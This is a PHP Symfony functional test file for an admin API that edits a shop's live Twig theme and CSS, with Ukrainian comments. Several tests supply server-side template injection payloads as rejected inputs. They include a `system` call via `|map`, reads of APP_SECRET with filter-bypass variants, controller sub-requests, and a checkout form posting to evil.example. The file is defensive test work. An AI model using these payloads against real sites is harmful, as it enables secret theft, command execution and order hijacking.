<?php

declare(strict_types=1);

namespace App\Tests\Functional\AdminApi;

use App\Core\AdminApi\AdminApiTokens;
use App\Core\AdminApi\ApiScope;
use App\Core\AdminApi\Theme\ThemeService;
use App\Core\Catalog\Entity\Product;
use App\Core\Security\Entity\User;
use App\Core\Security\Enum\UserRole;
use App\Site\Theme\Live\LiveTheme;
use Doctrine\ORM\EntityManagerInterface;
use Monolog\Handler\TestHandler;
use Monolog\Logger;
use Symfony\Bundle\FrameworkBundle\KernelBrowser;
use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;
use Symfony\Component\Filesystem\Filesystem;
use Symfony\Component\Lock\LockFactory;
use Symfony\Component\Process\Process;

/**
 * Живий дизайн під токеном (theme:write, 20.10.2026): REST /api/admin/v1/theme — скоуп, перелік із джерелом (engine | pack | live),
 * theme.css віддається й підключається після стилів, живий шаблон береться першим (перед фікстурною темою паку), страж Twig
 * не пускає небезпечне до запису, провал рендера чи форма без CSRF/price повертають попередню версію, історія, revert, delete,
 * заборонена зона, ліміт розміру, журнал без вмісту.
 */
final class ThemeApiTest extends WebTestCase
{
    use CatalogFixtures;

    private KernelBrowser $client;
    private EntityManagerInterface $em;
    private string $adminHost;
    private string $siteHost;
    private string $liveDir;
    private TestHandler $log;

    protected function setUp(): void
    {
        $this->client = static::createClient();
        $this->client->disableReboot();
        $container = static::getContainer();
        $this->em = $container->get(EntityManagerInterface::class);
        /** @var string $adminHost */
        $adminHost = $container->getParameter('admin_host');
        $this->adminHost = $adminHost;
        /** @var string $siteHost */
        $siteHost = $container->getParameter('site_host');
        $this->siteHost = $siteHost;
        /** @var string $liveDir */
        $liveDir = $container->getParameter('app.theme_live_dir');
        $this->liveDir = $liveDir;
        (new Filesystem())->remove($liveDir);
        $logger = $container->get('monolog.logger.admin_api');
        self::assertInstanceOf(Logger::class, $logger);
        $logger->pushHandler($this->log = new TestHandler());
        $ids = self::seedCatalog($this->em);
        // товар у тимчасовому кошику smoke: checkout рендериться з формою, а не веде в порожній кошик
        $this->em->find(Product::class, $ids['productId'])?->getDefaultVariant()->setStock('10');
        $this->em->flush();
    }

    protected function tearDown(): void
    {
        (new Filesystem())->remove($this->liveDir);
        parent::tearDown();
    }

    public function testWithoutScopeIsForbidden(): void
    {
        $token = $this->token([ApiScope::CatalogRead, ApiScope::ContentWrite, ApiScope::PricesWrite]);
        $this->api($token, 'GET', '/api/admin/v1/theme');
        self::assertResponseStatusCodeSame(403);
        self::assertSame('insufficient_scope', $this->json()['error'] ?? null);
        $this->api($token, 'PUT', '/api/admin/v1/theme/theme.css', 'a{}', 'text/plain');
        self::assertResponseStatusCodeSame(403);
        self::assertFileDoesNotExist($this->liveDir.'/public/theme.css');
    }

    public function testListShowsSourcesLockedZoneAndCss(): void
    {
        $token = $this->token();
        $list = $this->api($token, 'GET', '/api/admin/v1/theme');
        self::assertResponseIsSuccessful();
        $byPath = array_column($list['files'], null, 'path');
        self::assertSame('pack', $byPath['site/home.html.twig']['source'], 'у тестах фікстурна тема паку перекриває головну');
        self::assertSame('engine', $byPath['site/cart/index.html.twig']['source']);
        self::assertTrue($byPath['site/account/login.html.twig']['locked'] ?? false, 'кабінет — заборонена зона, лише читати');
        self::assertArrayNotHasKey('locked', $byPath['site/cart/index.html.twig']);
        self::assertSame('none', $byPath['theme.css']['source']);
        self::assertStringContainsString('@engine', $list['rules']);

        $get = $this->api($token, 'GET', '/api/admin/v1/theme/site/account/login.html.twig');
        self::assertResponseIsSuccessful();
        self::assertSame('engine', $get['source']);
        self::assertTrue($get['locked']);
        self::assertStringContainsString('{%', (string) $get['content'], 'текст шаблону рушія читається');
    }

    public function testCssIsStoredServedAndLinkedAfterEngineStyles(): void
    {
        $token = $this->token();
        $put = $this->api($token, 'PUT', '/api/admin/v1/theme/theme.css', '.live-marker{color:red}', 'text/plain');
        self::assertResponseIsSuccessful();
        self::assertSame(['live', 'skipped'], [$put['source'], $put['smoke']], 'CSS не ламає рендер — сторінки не перевіряються');
        self::assertFileExists($this->liveDir.'/public/theme.css');

        $html = $this->site('/');
        self::assertResponseIsSuccessful();
        self::assertMatchesRegularExpression('#<link rel="stylesheet" href="/assets/site\.css[^"]*">.*<link rel="stylesheet" href="/theme-live/theme\.css\?v=[a-f0-9]{10}">#s', $html, 'після стилів рушія');
        preg_match('#href="(/theme-live/theme\.css\?v=[a-f0-9]{10})"#', $html, $m);
        $css = $this->site($m[1]);
        self::assertResponseIsSuccessful();
        self::assertResponseHeaderSame('Content-Type', 'text/css; charset=UTF-8');
        self::assertStringContainsString('max-age=31536000', (string) $this->client->getResponse()->headers->get('Cache-Control'));
        self::assertSame('.live-marker{color:red}', $css);

        // JSON-тіло і unchanged
        $this->api($token, 'PUT', '/api/admin/v1/theme/theme.css', ['content' => '.live-marker{color:red}']);
        self::assertResponseIsSuccessful();
        self::assertTrue($this->json()['unchanged'] ?? false);

        $this->api($token, 'DELETE', '/api/admin/v1/theme/theme.css');
        self::assertResponseIsSuccessful();
        self::assertSame(['none', 1], [$this->json()['source'], \count($this->json()['history'])]);
        $this->site('/');
        self::assertStringNotContainsString('/theme-live/theme.css', (string) $this->client->getResponse()->getContent());
        $this->site('/theme-live/theme.css');
        self::assertResponseStatusCodeSame(404);
    }

    public function testLiveTemplateWinsOverPackHistoryRevertAndDelete(): void
    {
        $token = $this->token();
        $v1 = "{% extends '@engine/site/home.html.twig' %}{% block body %}<p class=\"live-v1\">live</p>{{ parent() }}{% endblock %}";
        $put = $this->api($token, 'PUT', '/api/admin/v1/theme/site/home.html.twig', $v1, 'text/plain');
        self::assertResponseIsSuccessful();
        self::assertSame(['live', 'ok', []], [$put['source'], $put['smoke'], $put['history']]);
        self::assertGreaterThanOrEqual(6, $put['pages'], 'головна по мовах, блог, категорія, товар, сторінка, кошик, checkout');
        $html = $this->site('/');
        self::assertStringContainsString('live-v1', $html, 'живий шаблон перекрив тему паку (pack-demo перекриває home)');
        self::assertStringContainsString('<main id="main">', $html);

        $v2 = str_replace('live-v1', 'live-v2', $v1);
        $put = $this->api($token, 'PUT', '/api/admin/v1/theme/site/home.html.twig', $v2, 'text/plain');
        self::assertResponseIsSuccessful();
        self::assertCount(1, $put['history']);
        self::assertStringContainsString('live-v2', $this->site('/'));
        self::assertStringNotContainsString('live-v1', (string) $this->client->getResponse()->getContent(), 'та сама назва файлу, новий вміст — без застарілого компільованого класу');

        $get = $this->api($token, 'GET', '/api/admin/v1/theme/site/home.html.twig');
        self::assertSame(['live', $v2], [$get['source'], $get['content']]);
        $this->api($token, 'POST', '/api/admin/v1/theme/site/home.html.twig/revert', ['version' => $get['history'][0]]);
        self::assertResponseIsSuccessful();
        self::assertCount(2, $this->json()['history']);
        self::assertStringContainsString('live-v1', $this->site('/'));

        $this->api($token, 'POST', '/api/admin/v1/theme/site/home.html.twig/revert', ['version' => '20200101-000000']);
        self::assertResponseStatusCodeSame(404);
        $this->api($token, 'POST', '/api/admin/v1/theme/site/home.html.twig/revert', ['version' => '../x']);
        self::assertResponseStatusCodeSame(422);

        $this->api($token, 'DELETE', '/api/admin/v1/theme/site/home.html.twig');
        self::assertResponseIsSuccessful();
        self::assertSame('pack', $this->json()['source'], 'без живого файлу — знову тема паку');
        self::assertStringNotContainsString('live-v', $this->site('/'));
        $this->api($token, 'DELETE', '/api/admin/v1/theme/site/home.html.twig');
        self::assertResponseStatusCodeSame(404);
    }

    public function testDangerousTwigIsRejectedBeforeWriting(): void
    {
        $token = $this->token();
        foreach ([
            "{{ source('site/base.html.twig') }}" => 'source()',
            "{{ ['ls']|map('system') }}" => '|map',
            "{% extends 'emails/base.html.twig' %}" => 'extends',
            '{% if %}' => 'Twig:',
        ] as $template => $reason) {
            $this->api($token, 'PUT', '/api/admin/v1/theme/site/partials/_support.html.twig', $template, 'text/plain');
            self::assertResponseStatusCodeSame(422, $template);
            self::assertSame('validation_failed', $this->json()['error']);
            self::assertStringContainsString($reason, implode(' ', $this->json()['errors']));
        }
        self::assertFileDoesNotExist($this->liveDir.'/templates/site/partials/_support.html.twig');
        self::assertDirectoryDoesNotExist($this->liveDir.'/history');
    }

    /**
     * Рев'ю C PR #108 M1–M2: секрети оточення через app.request.server (і обходи _context/attribute/set), sub-request через
     * render(controller()), читання будь-якого шаблону через include_only — усе відхиляється до запису, у HTML сайту секрету нема.
     */
    public function testLiveTemplateCannotReadSecretsOrRunControllers(): void
    {
        $token = $this->token();
        $secret = (string) ($_SERVER['APP_SECRET'] ?? $_ENV['APP_SECRET'] ?? '');
        self::assertNotSame('', $secret, 'APP_SECRET тестового оточення має бути в $_SERVER — інакше перевірка порожня');
        $base = "{% extends '@engine/site/home.html.twig' %}{% block body %}BODY{{ parent() }}{% endblock %}";
        foreach ([
            "<p class=\"leak\">{{ app.request.server.get('APP_SECRET') }}</p>" => 'app.request.server.get',
            "<p class=\"leak\">{{ _context.app.request.server.get('APP_SECRET') }}</p>" => '_context',
            "<p class=\"leak\">{{ attribute(app.request, 'ser' ~ 'ver').get('APP_SECRET') }}</p>" => 'attribute()',
            "{% set r = app %}<p class=\"leak\">{{ r.request.server.get('APP_SECRET') }}</p>" => 'app (рядок',
            "{% set r = app.request %}<p class=\"leak\">{{ r.server.get('APP_SECRET') }}</p>" => 'app.request (рядок',
            "<p class=\"leak\">{{ app.session.get('x') }}{{ app.token }}</p>" => 'app.session',
            "{{ render(controller('App\\\\Core\\\\AdminApi\\\\Controller\\\\MeController::me')) }}" => 'render()',
            "{{ render_esi(url('site_home')) }}" => 'render_esi()',
            '{{ include_only(app.request.query.t) }}' => 'include_only()',
            "{{ include(template_from_string('{{ app }}')) }}" => 'Twig:',
            "{{ 'phpinfo'|invoke }}" => '|invoke',
            '{% do cart.clear() %}' => '.clear',
        ] as $body => $reason) {
            $this->api($token, 'PUT', '/api/admin/v1/theme/site/home.html.twig', str_replace('BODY', $body, $base), 'text/plain');
            self::assertResponseStatusCodeSame(422, $body);
            self::assertSame('validation_failed', $this->json()['error'], $body);
            self::assertStringContainsString($reason, implode(' | ', $this->json()['errors']), $body);
        }
        self::assertFileDoesNotExist($this->liveDir.'/templates/site/home.html.twig');
        $html = $this->site('/');
        self::assertResponseIsSuccessful();
        self::assertStringNotContainsString($secret, $html);
        self::assertStringNotContainsString('class="leak"', $html);
    }

    /**
     * Рев'ю C PR #108 M3: один запис за раз. Інший процес тримає блокування магазину → PUT чекає і пише після нього; якщо
     * блокування не звільняється довше за app.theme_lock_wait (test: 2 с) → 409 locked, файл не чіпається.
     */
    public function testWritesAreSerializedByStoreLock(): void
    {
        $token = $this->token();
        $container = static::getContainer();
        $hold = new Process([\PHP_BINARY, '-r', \sprintf('require %s; $s = new Symfony\\Component\\Lock\\Store\\FlockStore(); $k = new Symfony\\Component\\Lock\\Key(%s); $s->save($k); echo "held\n"; usleep(1200000); $s->delete($k);', var_export($container->getParameter('kernel.project_dir').'/vendor/autoload.php', true), var_export(ThemeService::LOCK, true))]);
        $hold->start();
        $hold->waitUntil(static fn (string $type, string $out): bool => str_contains($out, 'held'));
        $started = microtime(true);
        $this->api($token, 'PUT', '/api/admin/v1/theme/theme.css', '.lock{color:red}', 'text/plain');
        $elapsed = microtime(true) - $started;
        $hold->wait();
        self::assertResponseIsSuccessful('PUT має дочекатися звільнення блокування, не впасти');
        self::assertGreaterThan(0.8, $elapsed, 'PUT не чекав на блокування іншого процесу');
        self::assertStringEqualsFile($this->liveDir.'/public/theme.css', '.lock{color:red}');

        $lock = $container->get(LockFactory::class)->createLock(ThemeService::LOCK, 30);
        self::assertTrue($lock->acquire());
        try {
            $this->api($token, 'PUT', '/api/admin/v1/theme/theme.css', '.lock{color:blue}', 'text/plain');
            self::assertResponseStatusCodeSame(409);
            self::assertSame('locked', $this->json()['error']);
            self::assertSame(5, $this->json()['retry_after']);
            $this->api($token, 'DELETE', '/api/admin/v1/theme/theme.css');
            self::assertResponseStatusCodeSame(409);
        } finally {
            $lock->release();
        }
        self::assertStringEqualsFile($this->liveDir.'/public/theme.css', '.lock{color:red}');
        $this->api($token, 'PUT', '/api/admin/v1/theme/theme.css', '.lock{color:blue}', 'text/plain');
        self::assertResponseIsSuccessful();
    }

    public function testRenderFailureRestoresPreviousVersion(): void
    {
        $token = $this->token();
        $ok = "{% extends '@engine/site/home.html.twig' %}{% block body %}<p class=\"live-ok\">ok</p>{{ parent() }}{% endblock %}";
        $this->api($token, 'PUT', '/api/admin/v1/theme/site/home.html.twig', $ok, 'text/plain');
        self::assertResponseIsSuccessful();

        // strict_variables у test: невідома змінна — RuntimeError → 500 на головній → файл повернуто
        $broken = "{% extends '@engine/site/home.html.twig' %}{% block body %}{{ nope.name }}{% endblock %}";
        $this->api($token, 'PUT', '/api/admin/v1/theme/site/home.html.twig', $broken, 'text/plain');
        self::assertResponseStatusCodeSame(422);
        self::assertStringContainsString('site_home', $this->json()['error_description']);
        self::assertStringContainsString('файл повернуто', $this->json()['error_description']);
        self::assertSame($ok, file_get_contents($this->liveDir.'/templates/site/home.html.twig'));
        self::assertStringContainsString('live-ok', $this->site('/'));
        self::assertResponseIsSuccessful();
        self::assertSame([], glob($this->liveDir.'/history/site__home.html.twig/*') ?: [], 'повернута версія знов поточна — дубля в історії не лишається (L3)');

        // нового файлу після провалу не лишається
        $this->api($token, 'PUT', '/api/admin/v1/theme/site/partials/_footer.html.twig', '{{ nope.name }}', 'text/plain');
        self::assertResponseStatusCodeSame(422);
        self::assertFileDoesNotExist($this->liveDir.'/templates/site/partials/_footer.html.twig');
        self::assertTrue($this->log->hasWarningThatContains('theme.put_rejected'));
    }

    public function testCheckoutAndCartFormsAreGuarded(): void
    {
        $token = $this->token();
        $noToken = "{% extends '@engine/site/checkout/index.html.twig' %}{% block body %}<form method=\"post\" action=\"{{ path('site_checkout') }}\" class=\"checkout\"><input type=\"hidden\" name=\"key\" value=\"{{ data.key }}\"><input type=\"hidden\" name=\"price\" value=\"{{ totals.priceFingerprint() }}\"><button>Go</button></form>{% endblock %}";
        $this->api($token, 'PUT', '/api/admin/v1/theme/site/checkout/index.html.twig', $noToken, 'text/plain');
        self::assertResponseStatusCodeSame(422);
        self::assertStringContainsString('без CSRF-токена _token', $this->json()['error_description']);

        $noPrice = "{% extends '@engine/site/checkout/index.html.twig' %}{% block body %}<form method=\"post\" action=\"{{ path('site_checkout') }}\" class=\"checkout\"><input type=\"hidden\" name=\"_token\" value=\"{{ csrf_token('checkout') }}\"><input type=\"hidden\" name=\"key\" value=\"{{ data.key }}\"><button>Go</button></form>{% endblock %}";
        $this->api($token, 'PUT', '/api/admin/v1/theme/site/checkout/index.html.twig', $noPrice, 'text/plain');
        self::assertResponseStatusCodeSame(422);
        self::assertStringContainsString('без поля price', $this->json()['error_description']);

        $foreign = "{% extends '@engine/site/checkout/index.html.twig' %}{% block body %}<form method=\"post\" action=\"https://evil.example/order\" class=\"checkout\"><input type=\"hidden\" name=\"_token\" value=\"{{ csrf_token('checkout') }}\"><input type=\"hidden\" name=\"key\" value=\"1\"><input type=\"hidden\" name=\"price\" value=\"1\"><button>Go</button></form>{% endblock %}";
        $this->api($token, 'PUT', '/api/admin/v1/theme/site/checkout/index.html.twig', $foreign, 'text/plain');
        self::assertResponseStatusCodeSame(422);
        self::assertStringContainsString('лише адреси свого сайту', $this->json()['error_description']);
        self::assertFileDoesNotExist($this->liveDir.'/templates/site/checkout/index.html.twig');

        $noForms = "{% extends '@engine/site/cart/index.html.twig' %}{% block body %}<p>cart</p>{% endblock %}";
        $this->api($token, 'PUT', '/api/admin/v1/theme/site/cart/index.html.twig', $noForms, 'text/plain');
        self::assertResponseStatusCodeSame(422);
        self::assertStringContainsString('нема форм зміни кількості', $this->json()['error_description']);

        // той самий checkout з формою рушія (блок body з parent) — проходить
        $fine = "{% extends '@engine/site/checkout/index.html.twig' %}{% block body %}<p class=\"live-note\">note</p>{{ parent() }}{% endblock %}";
        $this->api($token, 'PUT', '/api/admin/v1/theme/site/checkout/index.html.twig', $fine, 'text/plain');
        self::assertResponseIsSuccessful();
    }

    public function testForbiddenPathsAndLimits(): void
    {
        $token = $this->token();
        $this->api($token, 'PUT', '/api/admin/v1/theme/site/account/login.html.twig', '<p>x</p>', 'text/plain');
        self::assertResponseStatusCodeSame(422);
        self::assertStringContainsString('Заборонена зона', $this->json()['error_description']);
        $this->api($token, 'PUT', '/api/admin/v1/theme/site/partials/_schema.html.twig', '<p>x</p>', 'text/plain');
        self::assertResponseStatusCodeSame(422);
        $this->api($token, 'PUT', '/api/admin/v1/theme/site/sitemap.xml.twig', '<x/>', 'text/plain');
        self::assertResponseStatusCodeSame(422);
        // поза site/** маршрут не збігається — 404; «..» браузер/клієнт нормалізує, у маршруті його нема
        $this->api($token, 'PUT', '/api/admin/v1/theme/emails/order.html.twig', '<p>x</p>', 'text/plain');
        self::assertResponseStatusCodeSame(404);
        $this->api($token, 'PUT', '/api/admin/v1/theme/site/x.php', '<p>x</p>', 'text/plain');
        self::assertResponseStatusCodeSame(404);

        $this->api($token, 'PUT', '/api/admin/v1/theme/theme.css', str_repeat('a', ThemeService::MAX_BYTES + 1), 'text/plain');
        self::assertResponseStatusCodeSame(413);
        self::assertSame('payload_too_large', $this->json()['error']);
        self::assertFileDoesNotExist($this->liveDir.'/public/theme.css');

        $this->api($token, 'PUT', '/api/admin/v1/theme/theme.css', ['nope' => 1]);
        self::assertResponseStatusCodeSame(400);
        self::assertSame([], glob($this->liveDir.'/templates/site/*') ?: []);
    }

    public function testLogRecordsWhoAndFileWithoutContent(): void
    {
        $token = $this->token();
        $this->api($token, 'PUT', '/api/admin/v1/theme/theme.css', '.secret-marker{}', 'text/plain');
        self::assertResponseIsSuccessful();
        $records = array_values(array_filter($this->log->getRecords(), static fn ($r): bool => 'theme.put' === $r->message));
        self::assertCount(1, $records);
        self::assertSame(LiveTheme::CSS, $records[0]->context['path']);
        self::assertNotNull($records[0]->context['user_id']);
        self::assertNotNull($records[0]->context['token_id']);
        self::assertStringNotContainsString('secret-marker', json_encode($records[0]->context, \JSON_THROW_ON_ERROR), 'вміст файлу в журнал не потрапляє');
    }

    /**
     * @param list<ApiScope> $scopes
     */
    private function token(array $scopes = [ApiScope::ThemeWrite]): string
    {
        $user = new User('olena-theme@example.test', 'Олена', UserRole::Manager);
        $this->em->persist($user);
        $this->em->flush();

        return static::getContainer()->get(AdminApiTokens::class)->issue($user, 'cc', $scopes, 30, $user)->plain;
    }

    /**
     * @param array<mixed>|string|null $body
     *
     * @return array<string, mixed>
     */
    private function api(string $bearer, string $method, string $path, array|string|null $body = null, string $contentType = 'application/json'): array
    {
        $server = ['HTTP_AUTHORIZATION' => 'Bearer '.$bearer, 'HTTP_ACCEPT' => 'application/json'];
        if (null !== $body) {
            $server['CONTENT_TYPE'] = $contentType;
        }
        $this->client->request($method, 'https://'.$this->adminHost.$path, server: $server, content: \is_array($body) ? json_encode($body, \JSON_THROW_ON_ERROR) : $body);

        return $this->json();
    }

    /** @return array<string, mixed> */
    private function json(): array
    {
        $json = json_decode((string) $this->client->getResponse()->getContent(), true);

        return \is_array($json) ? $json : [];
    }

    private function site(string $path): string
    {
        $this->client->request('GET', 'https://'.$this->siteHost.$path);

        return (string) $this->client->getResponse()->getContent();
    }
}
